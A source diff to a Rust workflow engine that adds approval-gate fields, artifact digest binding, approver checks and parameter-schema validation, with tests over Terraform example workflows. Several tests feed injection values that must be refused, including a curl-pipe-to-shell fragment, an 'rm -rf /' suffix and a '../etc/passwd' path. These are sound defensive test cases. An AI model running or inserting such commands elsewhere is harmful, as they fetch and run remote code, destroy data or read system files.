@@ -135,6 +135,40 @@ pub struct TaskSpec {
     /// `"reject"`: absent a human decision, a gate fails safe).
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub approval_on_timeout: Option<String>,
+    /// For a `type: approval` task: what the approver is being asked to decide,
+    /// shown beside the gate in the approvals worklist. Templates at expansion
+    /// (`{{ params.* }}`), so `"Apply {{ stack }} to production?"` names the
+    /// stack. Text only — it is never executed.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub approval_message: Option<String>,
+    /// For a `type: approval` task: artifacts the approver should read before
+    /// deciding, each `<task>/<name>` — the same key the artifact API serves
+    /// (`/api/runs/{run}/artifacts/<task>/<name>`) and the same layout a task
+    /// gets by writing `$DAGRON_ARTIFACTS/<task>/<name>`. Templates at expansion.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub approval_show: Vec<String>,
+    /// For a `type: approval` task: artifacts (`<task>/<name>`, as above) whose
+    /// exact bytes this approval covers. They are shown like `approval_show`,
+    /// and the gateway refuses an approval that does not carry the sha256 of
+    /// each one as it now stands, so a plan changed after review cannot be
+    /// approved unseen. On approval the digests are written to
+    /// `$DAGRON_ARTIFACTS/<gate>/approved.sha256` for downstream tasks to
+    /// check with `sha256sum -c`. Enforced by the gateway only.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub binds: Vec<String>,
+    /// For a `type: approval` task: who may decide it. Each entry is an
+    /// identity (the approver's email, or their subject when the session has
+    /// none) or `group:<name>`; matching is case-insensitive. Empty = any
+    /// authenticated user, as before. Enforced by the authenticated gateway;
+    /// the engine's own management API has no caller identity to check.
+    /// Templates at expansion.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub approvers: Vec<String>,
+    /// For a `type: approval` task: the identity that triggered the run may not
+    /// decide it (separation of duties). Runs with no recorded triggerer
+    /// (schedules, dataset fires) have nobody to exclude.
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    pub not_triggerer: bool,
     /// How many times this task may be attempted before it is marked failed.
     /// 1 = no retries (default). Must be ≥ 1.
     #[serde(default = "default_max_attempts")]
@@ -744,6 +778,85 @@ pub const TASK_KINDS: &[&str] = &["task", "approval", "workflow", "wait"];
 /// Valid `approval_on_timeout:` values.
 pub const APPROVAL_TIMEOUT_ACTIONS: &[&str] = &["approve", "reject"];
 
+/// Longest `approval_message` / decision comment accepted, in characters.
+pub const APPROVAL_TEXT_MAX: usize = 2000;
+
+/// Most artifacts one gate may ask its approver to read.
+pub const APPROVAL_SHOW_MAX: usize = 16;
+
+/// Most entries one gate's `approvers:` may list.
+pub const APPROVERS_MAX: usize = 64;
+
+/// Check one `approvers:` entry: a non-empty identity or `group:<name>`, with no
+/// whitespace or control characters (an identity that cannot match anything is
+/// a typo, and a gate nobody can open is a run stuck until its timeout).
+pub fn validate_approver(entry: &str) -> Result<(), String> {
+    let name = entry.strip_prefix("group:").unwrap_or(entry);
+    if name.is_empty()
+        || entry.chars().count() > 254
+        || entry.chars().any(|c| c.is_whitespace() || c.is_control())
+    {
+        return Err(format!(
+            "invalid approvers entry '{entry}'; expected an email/subject or 'group:<name>'"
+        ));
+    }
+    Ok(())
+}
+
+/// The log line(s) a decided approval gate carries, so the decision shows up in
+/// the run's merged log beside the tasks around it. `output` stays the bare
+/// `approved` / `rejected` that `when:` conditions read; this goes in `log`.
+///
+/// The log is read line by line, so free text must not be able to start a line of its own:
+/// a comment of `"ok\nrejected by mallory at ..."` would otherwise put a second, forged
+/// verdict in the run log beside the real one. Line breaks in the comment and in the decider's
+/// name are therefore written as the visible escapes `\n` / `\r` (nothing is dropped, so a
+/// reader can still see the comment had several lines). The stored `decision_comment` keeps
+/// the original text; only this rendering is escaped.
+pub fn approval_log(approve: bool, decided_by: Option<&str>, comment: Option<&str>, at: &str) -> String {
+    fn one_line(s: &str) -> String {
+        s.replace('\r', "\\r").replace('\n', "\\n")
+    }
+    let verb = if approve { "approved" } else { "rejected" };
+    let mut s = format!("{verb} by {} at {at}", one_line(decided_by.unwrap_or("unknown")));
+    if let Some(c) = comment.map(str::trim).filter(|c| !c.is_empty()) {
+        s.push_str("\ncomment: ");
+        s.push_str(&one_line(c));
+    }
+    s
+}
+
+/// Whether a caller may decide a gate whose `approvers:` is `approvers`. An
+/// empty list admits everyone (the pre-`approvers` behaviour).
+pub fn approver_permits(approvers: &[String], email: &str, sub: &str, groups: &[String]) -> bool {
+    approvers.is_empty()
+        || approvers.iter().any(|a| match a.strip_prefix("group:") {
+            Some(g) => groups.iter().any(|x| x.eq_ignore_ascii_case(g)),
+            None => {
+                (!email.is_empty() && a.eq_ignore_ascii_case(email))
+                    || (!sub.is_empty() && a.eq_ignore_ascii_case(sub))
+            }
+        })
+}
+
+/// Check one `approval_show:` entry: exactly `<task>/<name>`, both non-empty,
+/// and nothing that could climb out of the run's artifact directory. Shared
+/// with the API's mirror validation so a gate saved through either path is
+/// held to the same rule.
+pub fn validate_approval_show(entry: &str) -> Result<(), String> {
+    let mut parts = entry.split('/');
+    let (task, name, rest) = (parts.next(), parts.next(), parts.next());
+    let ok = |s: &str| {
+        !s.is_empty() && s != "." && s != ".." && !s.contains('\\') && !s.chars().any(char::is_control)
+    };
+    match (task, name, rest) {
+        (Some(t), Some(n), None) if ok(t) && ok(n) => Ok(()),
+        _ => Err(format!(
+            "invalid approval_show entry '{entry}'; expected '<task>/<name>' (e.g. 'plan/plan.txt')"
+        )),
+    }
+}
+
 impl TaskSpec {
     /// Whether this task is a `type: approval` human gate (#19).
     pub fn is_approval(&self) -> bool {
@@ -944,6 +1057,57 @@ pub struct RunBudget {
     pub external_cost_attribution: bool,
 }
 
+/// Constraints on one top-level workflow parameter (`param_schema:`).
+///
+/// A separate block rather than a richer `parameters:` value, so every existing
+/// `parameters: { name: default }` spec keeps parsing and behaving unchanged.
+/// An empty value counts as "not supplied": `required` rejects it, the other
+/// rules skip it.
+#[derive(Debug, Clone, Default, Deserialize, Serialize, PartialEq, Eq)]
+pub struct ParamRule {
+    /// The final value must be non-empty. Checked when a run is triggered, not
+    /// when the workflow is saved, so a required parameter may have no default.
+    #[serde(default, skip_serializing_if = "is_false")]
+    pub required: bool,
+    /// The value must be exactly one of these.
+    #[serde(default, rename = "enum", skip_serializing_if = "Vec::is_empty")]
+    pub choices: Vec<String>,
+    /// A regular expression the **whole** value must match.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub pattern: Option<String>,
+    /// Shown to whoever triggers the run; the engine ignores it.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub description: Option<String>,
+}
+
+impl ParamRule {
+    /// Whether `value` satisfies `enum` and `pattern`. `enforce_required` adds the
+    /// non-empty check. `Err` is the reason, phrased to follow the parameter name.
+    fn check(&self, value: &str, enforce_required: bool) -> std::result::Result<(), String> {
+        if value.is_empty() {
+            return if self.required && enforce_required {
+                Err("is required".to_string())
+            } else {
+                Ok(())
+            };
+        }
+        if !self.choices.is_empty() && !self.choices.iter().any(|c| c == value) {
+            return Err(format!("must be one of: {}", self.choices.join(", ")));
+        }
+        if let Some(p) = &self.pattern {
+            let re = compile_param_pattern(p).map_err(|e| e.to_string())?;
+            if !re.is_match(value) {
+                return Err(format!("must match {p}"));
+            }
+        }
+        Ok(())
+    }
+}
+
+fn compile_param_pattern(p: &str) -> std::result::Result<regex::Regex, regex::Error> {
+    regex::Regex::new(&format!(r"\A(?:{p})\z"))
+}
+
 #[derive(Debug, Clone, Deserialize, Serialize)]
 pub struct DagSpec {
     pub name: String,
@@ -951,10 +1115,33 @@ pub struct DagSpec {
     /// task field and overridable when this workflow is itself called as a template.
     #[serde(default)]
     pub parameters: BTreeMap<String, String>,
+    /// Constraints on the top-level `parameters`, enforced when a run is
+    /// triggered (`DagGraph::from_yaml_with_params`): `required`, `enum`,
+    /// `pattern`. Keyed by parameter name; every key must also be declared under
+    /// `parameters:` so a typo cannot silently leave a parameter unconstrained.
+    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
+    pub param_schema: BTreeMap<String, ParamRule>,
+    /// Scopes [`Self::max_active_runs`] to runs sharing this value instead of to
+    /// the whole workflow: `max_active_runs: 1` with
+    /// `concurrency_key: "{{ stack }}"` allows one run per stack, in parallel
+    /// across stacks. Accepts `{{ param }}` templates; requires
+    /// `max_active_runs`.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub concurrency_key: Option<String>,
     /// Reusable sub-DAGs callable via a task's `template:` field. Expanded inline
     /// into the main `tasks` graph at run-creation time (see [`crate::expand`]).
     #[serde(default)]
     pub templates: Vec<TemplateSpec>,
+    /// Template libraries to import (`use: [library, library/template]`).
+    ///
+    /// Resolved by `dagron-api` before this parser runs, which appends the
+    /// libraries' templates to [`Self::templates`] and removes the key. Declared
+    /// here, rather than left unknown, because `DagSpec` carries no
+    /// `deny_unknown_fields`: a path that never resolved it (a file ingest, a git
+    /// sync) would otherwise drop it and fail later as an unrelated "unknown
+    /// template". `expand` refuses it with the actual cause.
+    #[serde(default, rename = "use", skip_serializing_if = "Vec::is_empty")]
+    pub uses: Vec<String>,
     /// Labels for organizing and filtering workflows (parity fast-win #26 —
     /// Airflow #16432 colored tags / #24464 folder view, Dagster #14530). Purely
     /// organizational — the engine ignores them; the workflow registry surfaces
@@ -1185,6 +1372,44 @@ pub struct GitNotify {
     pub description: Option<String>,
 }
 
+impl DagSpec {
+    /// Check `param_schema` against the current `parameters`. A malformed rule is
+    /// an ordinary error; a value that breaks a rule is a typed
+    /// [`crate::models::ParameterInvalid`]. `enforce_required` is true only when
+    /// a run is being triggered.
+    pub fn check_params(&self, enforce_required: bool) -> Result<()> {
+        for (name, rule) in &self.param_schema {
+            if !self.parameters.contains_key(name) {
+                bail!(
+                    "param_schema.{name} has no matching entry under parameters: \
+                     (declare it, with \"\" as the default if there is none)"
+                );
+            }
+            if rule.choices.is_empty() && rule.pattern.is_none() && !rule.required
+                && rule.description.is_none()
+            {
+                bail!("param_schema.{name} sets no rule (use required, enum or pattern)");
+            }
+            let mut seen = std::collections::HashSet::new();
+            if let Some(dup) = rule.choices.iter().find(|c| !seen.insert(c.as_str())) {
+                bail!("param_schema.{name}.enum lists '{dup}' twice");
+            }
+            if rule.choices.iter().any(String::is_empty) {
+                bail!("param_schema.{name}.enum has an empty entry; use required for that");
+            }
+            if let Some(p) = &rule.pattern {
+                compile_param_pattern(p)
+                    .map_err(|e| anyhow::anyhow!("param_schema.{name}.pattern is not a valid regex: {e}"))?;
+            }
+            let value = self.parameters.get(name).map(String::as_str).unwrap_or("");
+            rule.check(value, enforce_required).map_err(|reason| {
+                anyhow::Error::new(crate::models::ParameterInvalid { name: name.clone(), reason })
+            })?;
+        }
+        Ok(())
+    }
+}
+
 pub struct DagGraph {
     pub spec: DagSpec,
     graph: DiGraph<String, ()>,
@@ -1198,6 +1423,10 @@ impl DagGraph {
     /// uses, so sub-workflow support is uniform across the API, cron, and ingest.
     pub fn from_yaml(yaml: &str) -> Result<Self> {
         let spec: DagSpec = serde_yaml::from_str(yaml)?;
+        // Authoring path: no run is being triggered, so `required` is not
+        // enforced, but a rule that is malformed or contradicts its own default
+        // is still an error.
+        spec.check_params(false)?;
         let spec = crate::expand::expand(spec)?;
         Self::from_spec(spec)
     }
@@ -1217,6 +1446,9 @@ impl DagGraph {
         for (k, v) in overrides {
             spec.parameters.insert(k.clone(), v.clone());
         }
+        // Checked on the merged values and before expansion substitutes them
+        // into task fields, so a refused value never reaches a command line.
+        spec.check_params(true)?;
         let spec = crate::expand::expand(spec)?;
         Self::from_spec(spec)
     }
@@ -1228,6 +1460,26 @@ impl DagGraph {
 
         if spec.run_timeout_secs == Some(0) {
             bail!("invalid run_timeout_secs=0 in DAG '{}'; expected >= 1 (or omit)", spec.name);
+        }
+        if let Some(key) = &spec.concurrency_key {
+            if key.trim().is_empty() {
+                bail!("concurrency_key in DAG '{}' is empty", spec.name);
+            }
+            if key.contains("{{") {
+                bail!(
+                    "concurrency_key '{key}' in DAG '{}' references a parameter that has no value",
+                    spec.name
+                );
+            }
+            if key.len() > 200 {
+                bail!("concurrency_key in DAG '{}' is longer than 200 bytes", spec.name);
+            }
+            if spec.max_active_runs.unwrap_or(0) == 0 {
+                bail!(
+                    "concurrency_key in DAG '{}' needs max_active_runs >= 1: it only scopes that cap",
+                    spec.name
+                );
+            }
         }
         // The task budget is checked here rather than at dispatch, because here
         // it can be exact. `from_spec` runs *after* expansion, so `spec.tasks`
@@ -1311,6 +1563,9 @@ impl DagGraph {
             // is what would otherwise happen: `DagSpec` has no
             // `deny_unknown_fields`.
             if !cfg!(feature = "enterprise") && budget.external_cost_attribution {
+                crate::metrics::record_signpost_hit(
+                    crate::metrics::SignpostGate::ExternalCostAttribution,
+                );
                 bail!(
                     "DAG '{}' requests external cost attribution: the ledger that reconciles \
                      each external job's actual vendor cost back to the run, workflow and team \
@@ -1471,6 +1726,68 @@ impl DagGraph {
             }
             if task.is_approval() && task.hook.is_some() {
                 bail!("task '{}' cannot be both an approval gate and a hook in DAG '{}'", task.name, spec.name);
+            }
+            // `approval_message` / `approval_show` describe a decision, so they
+            // only mean something on a gate; on any other task they would be
+            // silently ignored, which is how a typo'd `type:` hides.
+            if !task.is_approval() && (task.approval_message.is_some() || !task.approval_show.is_empty()) {
+                bail!(
+                    "task '{}' sets approval_message/approval_show but is not `type: approval` in DAG '{}'",
+                    task.name, spec.name
+                );
+            }
+            if let Some(m) = &task.approval_message {
+                if m.chars().count() > APPROVAL_TEXT_MAX {
+                    bail!(
+                        "approval_message on task '{}' in DAG '{}' exceeds {} characters",
+                        task.name, spec.name, APPROVAL_TEXT_MAX
+                    );
+                }
+            }
+            if task.approval_show.len() > APPROVAL_SHOW_MAX {
+                bail!(
+                    "approval_show on task '{}' in DAG '{}' lists {} artifacts; the limit is {}",
+                    task.name, spec.name, task.approval_show.len(), APPROVAL_SHOW_MAX
+                );
+            }
+            for entry in &task.approval_show {
+                if let Err(e) = validate_approval_show(entry) {
+                    bail!("task '{}' in DAG '{}': {e}", task.name, spec.name);
+                }
+            }
+            if !task.is_approval() && !task.binds.is_empty() {
+                bail!(
+                    "task '{}' sets binds but is not `type: approval` in DAG '{}'",
+                    task.name, spec.name
+                );
+            }
+            if task.binds.len() > APPROVAL_SHOW_MAX {
+                bail!(
+                    "binds on task '{}' in DAG '{}' lists {} artifacts; the limit is {}",
+                    task.name, spec.name, task.binds.len(), APPROVAL_SHOW_MAX
+                );
+            }
+            for entry in &task.binds {
+                if let Err(e) = validate_approval_show(entry) {
+                    bail!("task '{}' in DAG '{}': {}", task.name, spec.name, e.replace("approval_show", "binds"));
+                }
+            }
+            if !task.is_approval() && (!task.approvers.is_empty() || task.not_triggerer) {
+                bail!(
+                    "task '{}' sets approvers/not_triggerer but is not `type: approval` in DAG '{}'",
+                    task.name, spec.name
+                );
+            }
+            if task.approvers.len() > APPROVERS_MAX {
+                bail!(
+                    "approvers on task '{}' in DAG '{}' lists {} entries; the limit is {}",
+                    task.name, spec.name, task.approvers.len(), APPROVERS_MAX
+                );
+            }
+            for entry in &task.approvers {
+                if let Err(e) = validate_approver(entry) {
+                    bail!("task '{}' in DAG '{}': {e}", task.name, spec.name);
+                }
             }
             // Sub-workflow trigger (#23): needs a target workflow name, has no
             // command, and can't double as a hook. The `workflow:` field is only
@@ -1870,6 +2187,9 @@ impl DagGraph {
                 // `defer.connection:` — the governed endpoint registry.
                 if !cfg!(feature = "enterprise") {
                     if let Some(conn) = def.connection.as_deref() {
+                        crate::metrics::record_signpost_hit(
+                            crate::metrics::SignpostGate::DeferConnection,
+                        );
                         bail!(
                             "task '{}' in DAG '{}' defers on connection '{}': named connections — \
                              one access-controlled, audited registry of compute and warehouse \
@@ -2660,6 +2980,10 @@ tasks:
     #[cfg(not(feature = "enterprise"))]
     #[test]
     fn attribution_is_gated_and_the_signpost_names_the_open_ceiling() {
+        use crate::metrics::{signpost_hits, SignpostGate};
+        // The counter is process-wide and tests run in parallel, so a rise of
+        // at least one, not an exact count.
+        let before = signpost_hits(SignpostGate::ExternalCostAttribution);
         let err = DagGraph::from_yaml(
             "name: p\nbudget: { external_cost_attribution: true }\ntasks:\n  - { name: a, command: [x] }\n",
         )
@@ -2670,6 +2994,10 @@ tasks:
         assert!(err.contains("#what-this-build-does-not-do"), "links the anchor: {err}");
         assert!(err.contains("external_cost"), "names the OPEN ceiling, so the refusal is not read as 'budgets are paid': {err}");
         assert!(err.contains("`pool:`"), "names the other open bound: {err}");
+        assert!(
+            signpost_hits(SignpostGate::ExternalCostAttribution) > before,
+            "the refusal is counted"
+        );
         assert!(err.contains("docs/EXTERNAL_JOBS.md"), "names the open doc: {err}");
         assert!(err.contains("dagron_engine::Seams"), "names the seam: {err}");
     }
@@ -2873,6 +3201,431 @@ tasks:
         .expect("hook result_from must be rejected")
         .to_string();
         assert!(err.contains("result_from cannot name hook task 'fin'"), "got: {err}");
+    }
+
+    #[test]
+    fn terraform_example_parses_with_a_reviewable_gate() {
+        let yaml = include_str!("../../../examples/terraform/plan_review_apply.yaml");
+        let g = DagGraph::from_yaml(yaml).expect("example must validate");
+        let review = g.task_spec("review").unwrap();
+        assert!(review.is_approval());
+        assert_eq!(review.approval_show, vec!["plan/plan.txt".to_string()]);
+        assert!(
+            review.approval_message.as_deref().unwrap().contains("staging"),
+            "workflow parameters are substituted into the message: {:?}",
+            review.approval_message
+        );
+        assert_eq!(review.approval_on_timeout.as_deref(), Some("reject"));
+        assert_eq!(review.binds, vec!["plan/tfplan".to_string(), "plan/plan.txt".to_string()]);
+        assert_eq!(g.spec.concurrency_key.as_deref(), Some("./infra:staging"));
+        // `plan`'s stdout is the full log, so the gate keys on the marker task.
+        assert_eq!(review.depends_on, vec!["plan_result".to_string()]);
+        assert!(g.task_spec("plan_result").is_some());
+
+        // The schema is live: production is a valid target, a typo or a shell
+        // fragment in the directory is refused before any task exists.
+        let go = |kv: &[(&str, &str)]| trigger(yaml, kv);
+        assert!(go(&[("environment", "prod")]).is_ok());
+        assert_eq!(
+            refusal(go(&[("environment", "prd")])),
+            "parameter 'environment' must be one of: dev, staging, prod"
+        );
+        assert!(go(&[("tf_dir", "./infra'; curl evil | sh; '")]).is_err());
+    }
+
+    #[test]
+    fn terraform_destroy_example_binds_the_saved_plan() {
+        let yaml = include_str!("../../../examples/terraform/plan_destroy_review.yaml");
+        let g = DagGraph::from_yaml(yaml).expect("example must validate");
+        let review = g.task_spec("review").unwrap();
+        assert!(review.is_approval());
+        assert_eq!(review.depends_on, vec!["plan_result".to_string()]);
+        assert_eq!(review.binds, vec!["plan/tfplan".to_string(), "plan/plan.txt".to_string()]);
+        assert!(review.approval_message.as_deref().unwrap().starts_with("DESTROY"));
+        assert!(trigger(yaml, &[("environment", "prd")]).is_err());
+    }
+
+    #[test]
+    fn terraform_pr_and_drift_examples_parse() {
+        let pr = include_str!("../../../examples/terraform/pr_check.yaml");
+        let g = DagGraph::from_yaml(pr).expect("pr_check must validate");
+        assert!(g.spec.tasks.iter().all(|t| !t.is_approval()), "a PR check has no gate");
+        let plan = g.task_spec("speculative_plan").unwrap();
+        assert_eq!(plan.depends_on.len(), 4);
+        assert!(trigger(pr, &[("pr", "42")]).is_ok());
+        assert!(trigger(pr, &[("pr", "42; rm -rf /")]).is_err());
+
+        let drift = include_str!("../../../examples/terraform/drift_check.yaml");
+        let g = DagGraph::from_yaml(drift).expect("drift_check must validate");
+        assert!(g.task_spec("detect_drift").is_some());
+        assert!(g.task_spec("notify_failure").is_some());
+        assert!(trigger(drift, &[("environment", "qa")]).is_err());
+    }
+
+    #[test]
+    fn terraform_example_scripts_stop_at_the_first_failure() {
+        // Without `set -e` a failed `sha256sum -c` or `workspace select` falls
+        // through to the apply, against the wrong bytes or environment.
+        for (file, yaml) in [
+            ("plan_review_apply", include_str!("../../../examples/terraform/plan_review_apply.yaml")),
+            ("plan_destroy_review", include_str!("../../../examples/terraform/plan_destroy_review.yaml")),
+            ("promote_environments", include_str!("../../../examples/terraform/promote_environments.yaml")),
+            ("lifecycle", include_str!("../../../examples/terraform/lifecycle.yaml")),
+            ("pr_check", include_str!("../../../examples/terraform/pr_check.yaml")),
+            ("drift_check", include_str!("../../../examples/terraform/drift_check.yaml")),
+        ] {
+            let g = DagGraph::from_yaml(yaml).expect("example must validate");
+            for t in &g.spec.tasks {
+                let Some(script) = t.command.last() else { continue };
+                if script.contains('\n') && script.contains("terraform -chdir") {
+                    assert!(
+                        script.starts_with("exec 2>&1\nset -e\n"),
+                        "{file}/{}: multi-line terraform step must start with `exec 2>&1` then `set -e`",
+                        t.name
+                    );
+                }
+            }
+        }
+    }
+
+    /// Two bugs the Terraform examples have each shipped, in several files: `checkov
+    /// --no-color` (checkov has no such flag, so it exits 2 before scanning anything) and a
+    /// destroy guard that pipes `show -json` into another command (a pipeline's status is the
+    /// last command's, so a failed `show` reads as "0 deletions" and the plan goes on to
+    /// approval). Every example is scanned, not a list, so the next copy-paste is caught too.
+    #[test]
+    fn examples_do_not_repeat_two_known_terraform_script_bugs() {
+        fn specs(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+            for e in std::fs::read_dir(dir).unwrap().flatten() {
+                let p = e.path();
+                if p.is_dir() {
+                    specs(&p, out);
+                } else if matches!(p.extension().and_then(|x| x.to_str()), Some("yaml" | "yml")) {
+                    out.push(p);
+                }
+            }
+        }
+        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../examples");
+        let mut files = Vec::new();
+        specs(&root, &mut files);
+        assert!(files.len() > 20, "found only {} example specs under {}", files.len(), root.display());
+
+        let mut found = Vec::new();
+        for f in &files {
+            let Ok(text) = std::fs::read_to_string(f) else { continue };
+            for (i, line) in text.lines().enumerate() {
+                let code = line.trim_start();
+                if code.starts_with('#') {
+                    continue;
+                }
+                let at = format!("{}:{}", f.strip_prefix(&root).unwrap_or(f).display(), i + 1);
+                if code.contains("checkov") && code.contains("--no-color") {
+                    found.push(format!("{at}: checkov has no --no-color flag (it exits 2 before scanning)"));
+                }
+                if code.contains("show -json") && code.contains('|') {
+                    found.push(format!(
+                        "{at}: `show -json` is piped, so a failed `show` is read as an empty plan; \
+                         capture it on its own line (`plan_json=$(... show -json ...)`) and count with `jq -e`"
+                    ));
+                }
+            }
+        }
+        assert!(found.is_empty(), "\n{}", found.join("\n"));
+    }
+
+    #[test]
+    fn terraform_promotion_example_gates_each_stage_after_dev() {
+        let yaml = include_str!("../../../examples/terraform/promote_environments.yaml");
+        let names = |g: &DagGraph| g.spec.tasks.iter().map(|t| t.name.clone()).collect::<Vec<_>>();
+
+        let g = trigger(yaml, &[("promote_through", "prod")]).expect("promote_environments must validate");
+        assert!(g.task_spec("dev.review").is_none(), "dev is ungated: no review task at all");
+        let dev_apply = g.task_spec("dev.apply").unwrap();
+        assert_eq!(dev_apply.depends_on, vec!["dev.changed".to_string()]);
+        assert_eq!(dev_apply.when.as_deref(), Some("{{ tasks.dev.changed.output }} == changes"));
+        for env in ["staging", "prod"] {
+            let review = g.task_spec(&format!("{env}.review")).unwrap();
+            assert!(review.is_approval());
+            assert_eq!(review.depends_on, vec![format!("{env}.changed")]);
+            assert_eq!(review.when, Some(format!("{{{{ tasks.{env}.changed.output }}}} == changes")));
+            assert_eq!(review.binds, vec![format!("plan_{env}/tfplan"), format!("plan_{env}/plan.txt")]);
+            assert_eq!(review.approval_show, vec![format!("plan_{env}/plan.txt")]);
+            assert_eq!(review.approval_on_timeout.as_deref(), Some("reject"));
+            assert!(!review.approval_message.as_deref().unwrap_or("").is_empty());
+            // The approval is published under the gate's own name; apply must read that.
+            let apply = g.task_spec(&format!("{env}.apply")).unwrap();
+            assert!(
+                apply.command.last().unwrap().contains(&format!("{env}.review/approved.sha256")),
+                "{env}.apply must check the digests its own gate wrote"
+            );
+            let plan = g.task_spec(&format!("{env}.plan")).unwrap();
+            assert_eq!(plan.trigger_rule.as_deref(), Some("none_failed"));
+        }
+        assert_eq!(g.task_spec("prod.plan").unwrap().depends_on, vec!["staging.apply".to_string()]);
+
+        // Stopping part-way removes the later stages rather than skipping them.
+        let g = trigger(yaml, &[("promote_through", "staging")]).unwrap();
+        assert!(names(&g).iter().any(|n| n == "staging.apply"));
+        assert!(names(&g).iter().all(|n| !n.starts_with("prod.")));
+        let g = trigger(yaml, &[("promote_through", "dev")]).unwrap();
+        assert!(names(&g).iter().all(|n| !n.starts_with("staging.") && !n.starts_with("prod.")));
+
+        assert!(trigger(yaml, &[("promote_through", "qa")]).is_err());
+        assert!(trigger(yaml, &[("allow_destroy", "yes")]).is_err());
+    }
+
+    #[test]
+    fn terraform_lifecycle_example_tears_down_only_after_the_deploy() {
+        let yaml = include_str!("../../../examples/terraform/lifecycle.yaml");
+        let g = trigger(yaml, &[]).expect("lifecycle must validate");
+        for key in ["deploy", "teardown"] {
+            let review = g.task_spec(&format!("{key}.review")).unwrap();
+            assert!(review.is_approval());
+            assert_eq!(
+                review.binds,
+                vec![format!("plan_{key}/tfplan"), format!("plan_{key}/plan.txt")]
+            );
+            assert_eq!(review.approval_on_timeout.as_deref(), Some("reject"));
+            let execute = g.task_spec(&format!("{key}.execute")).unwrap();
+            assert!(
+                execute
+                    .command
+                    .last()
+                    .unwrap()
+                    .contains(&format!("{key}.review/approved.sha256")),
+                "{key}.execute must check the digests its own gate wrote"
+            );
+            // The stage's exit, skipped unless the stage applied or had nothing to apply.
+            let done = g.task_spec(&format!("{key}.done")).unwrap();
+            assert_eq!(done.trigger_rule.as_deref(), Some("none_failed"));
+            let deps = ["changed", "review", "execute"].map(|t| format!("{key}.{t}"));
+            assert_eq!(done.depends_on, deps);
+        }
+        // The teardown plans only once the deploy's `done` succeeded. `none_failed`
+        // here would also accept the skipped apply a rejected deploy leaves.
+        let plan = g.task_spec("teardown.plan").unwrap();
+        assert_eq!(plan.depends_on, vec!["deploy.done".to_string()]);
+        assert_eq!(plan.trigger_rule, None);
+        assert!(plan.command.last().unwrap().contains(" plan -destroy "));
+        assert_eq!(g.task_spec("deploy.plan").unwrap().trigger_rule, None);
+
+        let g = trigger(yaml, &[("destroy_after", "false")]).unwrap();
+        assert!(g
+            .spec
+            .tasks
+            .iter()
+            .all(|t| !t.name.starts_with("teardown.")));
+        assert!(trigger(yaml, &[("destroy_after", "yes")]).is_err());
+    }
+
+    #[test]
+    fn approval_message_and_show_are_validated() {
+        let g = DagGraph::from_yaml(
+            "name: w\nparameters: { env: prod }\ntasks:\n  - { name: plan, command: [\"true\"] }\n  - { name: gate, type: approval, depends_on: [plan], approval_message: \"Apply to {{ params.env }}?\", approval_show: [\"plan/plan.txt\"] }\n",
+        )
+        .unwrap();
+        let gate = g.task_spec("gate").unwrap();
+        assert_eq!(gate.approval_show, vec!["plan/plan.txt".to_string()]);
+        assert!(gate.approval_message.as_deref().unwrap().starts_with("Apply to"));
+
+        for (frag, want) in [
+            ("approval_show: [\"../etc/passwd\"]", "invalid approval_show entry"),
+            ("approval_show: [\"plan\"]", "invalid approval_show entry"),
+            ("approval_show: [\"a/b/c\"]", "invalid approval_show entry"),
+            ("approval_show: [\"plan/\"]", "invalid approval_show entry"),
+        ] {
+            let yaml = format!("name: w\ntasks:\n  - {{ name: gate, type: approval, {frag} }}\n");
+            let err = DagGraph::from_yaml(&yaml).err().expect("rejected").to_string();
+            assert!(err.contains(want), "{frag}: got {err}");
+        }
+
+        // The fields mean nothing on a task that is not an approval gate.
+        let err = DagGraph::from_yaml(
+            "name: w\ntasks:\n  - { name: a, command: [\"true\"], approval_message: hi }\n",
+        )
+        .err()
+        .expect("rejected")
+        .to_string();
+        assert!(err.contains("approval_message"), "got: {err}");
+
+        let long = "x".repeat(APPROVAL_TEXT_MAX + 1);
+        let yaml = format!("name: w\ntasks:\n  - {{ name: g, type: approval, approval_message: \"{long}\" }}\n");
+        assert!(DagGraph::from_yaml(&yaml).is_err());
+    }
+
+    #[test]
+    fn approvers_and_not_triggerer_are_validated() {
+        let g = DagGraph::from_yaml(
+            "name: w\nparameters: { owner: Ops@Example.com }\ntasks:\n  - { name: gate, type: approval, approvers: [\"{{ owner }}\", \"group:release\"], not_triggerer: true }\n",
+        )
+        .unwrap();
+        let gate = g.task_spec("gate").unwrap();
+        assert_eq!(gate.approvers, vec!["Ops@Example.com".to_string(), "group:release".to_string()]);
+        assert!(gate.not_triggerer);
+
+        for (frag, want) in [
+            ("approvers: [\"\"]", "invalid approvers entry"),
+            ("approvers: [\"group:\"]", "invalid approvers entry"),
+            ("approvers: [\"a b\"]", "invalid approvers entry"),
+        ] {
+            let yaml = format!("name: w\ntasks:\n  - {{ name: gate, type: approval, {frag} }}\n");
+            let err = DagGraph::from_yaml(&yaml).err().expect("rejected").to_string();
+            assert!(err.contains(want), "{frag}: got {err}");
+        }
+        for frag in ["approvers: [a@b.c]", "not_triggerer: true"] {
+            let yaml = format!("name: w\ntasks:\n  - {{ name: a, command: [\"true\"], {frag} }}\n");
+            let err = DagGraph::from_yaml(&yaml).err().expect("rejected").to_string();
+            assert!(err.contains("not `type: approval`"), "{frag}: got {err}");
+        }
+    }
+
+    const SCHEMA_YAML: &str = "name: w\n\
+        parameters: { stack: \"\", action: plan }\n\
+        param_schema:\n\
+        \x20 stack: { required: true, pattern: \"[a-z][a-z0-9-]{1,20}\", description: which stack }\n\
+        \x20 action: { enum: [plan, apply] }\n\
+        tasks:\n  - { name: a, command: [\"echo\", \"{{ stack }}\", \"{{ action }}\"] }\n";
+
+    fn trigger(yaml: &str, kv: &[(&str, &str)]) -> Result<DagGraph> {
+        let p = kv.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect();
+        DagGraph::from_yaml_with_params(yaml, &p)
+    }
+
